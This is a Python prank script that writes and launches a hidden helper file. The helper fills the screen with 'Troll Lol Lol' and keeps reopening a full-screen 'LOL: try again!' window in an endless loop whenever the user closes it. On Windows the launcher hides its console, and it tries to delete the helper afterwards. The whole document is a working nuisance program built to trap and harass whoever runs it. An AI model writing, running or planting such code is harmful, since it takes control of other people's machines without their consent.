from platform import uname
from subprocess import call


def getPlatform():
    return uname()[0]

target = open("persistentTk.py", 'w')
target.write("""
from Tkinter import Label, Tk

root = Tk()
screen_height = root.winfo_screenheight()
screen_width = root.winfo_screenwidth()

label = Label(root,
              text = 'Troll Lol Lol',
              font = "Verdana 100 bold",
              height = screen_height,
              width = screen_width)

label.pack()
root.mainloop()

while True:
    root = Tk()
    label = Label(root,
                  text = 'LOL: try again!',
                  font = "Verdana 100 bold",
                  height = screen_height,
                  width = screen_width)

    label.pack()
    root.mainloop()
""")
target.close()

if getPlatform() == "Windows":
    CREATE_NO_WINDOW = 0x08000000
    call(["python", "persistentTk.py"], creationflags=CREATE_NO_WINDOW)
    call(["rm", "persistentTk.py"], creationflags=CREATE_NO_WINDOW)
else:
    call(["python", "persistentTk.py"])
    call(["rm", "persistentTk.py"])
